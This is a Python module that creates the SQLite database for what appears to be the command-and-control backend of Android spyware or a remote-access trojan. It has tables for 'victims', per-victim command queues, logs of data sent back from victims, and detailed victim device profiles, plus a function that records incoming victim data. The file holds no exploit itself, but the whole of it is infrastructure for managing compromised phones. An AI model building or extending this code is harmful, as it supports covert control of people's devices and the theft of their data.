import sqlite3
import os
from datetime import datetime

DB_PATH = 'aegis.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute("PRAGMA journal_mode=WAL;")
    c = conn.cursor()
    
    # Core Tables
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY,
        hostname TEXT,
        ip TEXT,
        os TEXT,
        last_seen TIMESTAMP,
        status TEXT DEFAULT 'offline'
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id TEXT PRIMARY KEY,
        victim_id TEXT,
        action TEXT,
        args TEXT,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMP
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        timestamp TIMESTAMP,
        data TEXT
    )''')
    
    # New: Victim Profiles for "Attacker ID" System
    c.execute('''CREATE TABLE IF NOT EXISTS victim_profiles (
        victim_id TEXT PRIMARY KEY,
        alias TEXT,
        notes TEXT,
        first_seen TIMESTAMP,
        last_seen TIMESTAMP,
        device_model TEXT,
        android_version TEXT,
        battery_level INTEGER,
        storage_total_gb REAL,
        storage_used_gb REAL,
        is_favorite BOOLEAN DEFAULT 0
    )''')
    
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def log_data(victim_id, data):
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO logs (victim_id, timestamp, data) VALUES (?, datetime('now'), ?)", (victim_id, str(data)))
    conn.commit()
    conn.close()
